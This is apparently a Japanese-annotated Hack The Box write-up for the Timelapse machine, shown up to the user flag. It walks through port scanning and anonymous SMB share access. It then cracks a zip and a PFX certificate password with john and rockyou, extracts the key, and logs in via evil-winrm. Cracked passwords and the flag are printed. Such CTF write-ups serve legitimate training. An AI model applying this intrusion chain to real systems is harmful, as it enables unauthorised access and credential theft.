https://app.hackthebox.com/machines/452

## STEP 1
```sh
└─$ rustscan -a 10.129.227.113 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.227.113:53
Open 10.129.227.113:88
Open 10.129.227.113:135
Open 10.129.227.113:139
Open 10.129.227.113:389
Open 10.129.227.113:445
Open 10.129.227.113:464
Open 10.129.227.113:3268
Open 10.129.227.113:3269
Open 10.129.227.113:5986
Open 10.129.227.113:9389
Open 10.129.227.113:49667
Open 10.129.227.113:49673
Open 10.129.227.113:49674
Open 10.129.227.113:49693
10.129.227.113 -> [53,88,135,139,389,445,464,3268,3269,5986,9389,49667,49673,49674,49693]
```


## STEP 2
匿名で共有フォルダ列挙  
(netexecやsmbmapでは列挙できなかった、きちんんと`-N`を指定しないといけないツールでないと列挙できない感じ？)
```sh
└─$ smbclient -L '10.129.227.113' -N                        

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
sharesにアクセス、zipファイルをダウンロード
```sh
└─$ smbclient -N //10.129.227.113/shares
Try "help" to get a list of possible commands.
smb: \>

smb: \> ls Dev\
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1328644 blocks available

smb: \> get Dev\winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as Dev\winrm_backup.zip (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
```
zipにパスワードあり、クラック成功
```sh
└─$ unzip Dev\\winrm_backup.zip 
Archive:  Dev\winrm_backup.zip
[Dev\winrm_backup.zip] legacyy_dev_auth.pfx password:

└─$ zip2john Dev\\winrm_backup.zip > zip.txt                                    
ver 2.0 efh 5455 efh 7875 Dev\winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

└─$  john --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP zip.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (Dev\winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-09-28 08:14) 4.545g/s 15769Kp/s 15769Kc/s 15769KC/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
zip解凍、pfxファイルを入手  
pfxからpemファイルに変換を試みたがここでもパスワードあり
```sh
└─$ unzip Dev\\winrm_backup.zip
Archive:  Dev\winrm_backup.zip
[Dev\winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx

└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
Enter Import Password:
```
クラック成功
```sh
└─$ pfx2john legacyy_dev_auth.pfx > pfx.txt

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=pfx pfx.txt
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:26 DONE (2025-09-28 08:36) 0.01155g/s 37333p/s 37333c/s 37333C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
pfxから公開鍵と秘密鍵の証明書を入手
```sh
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
Enter Import Password:

└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes   
Enter Import Password:

└─$ ls -l publicCert.pem priv-key.pem
-rw------- 1 kali kali 1952 Sep 28 08:42 priv-key.pem
-rw------- 1 kali kali 1232 Sep 28 08:41 publicCert.pem
```
winrmでログイン成功！  
ユーザフラグゲット
```sh
└─$ evil-winrm -S -c publicCert.pem -k priv-key.pem -r timelapse.htb -i 10.129.227.113
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> cat ../Desktop/user.txt
4e9c380f75f6cc9170a322e038205ec7
```
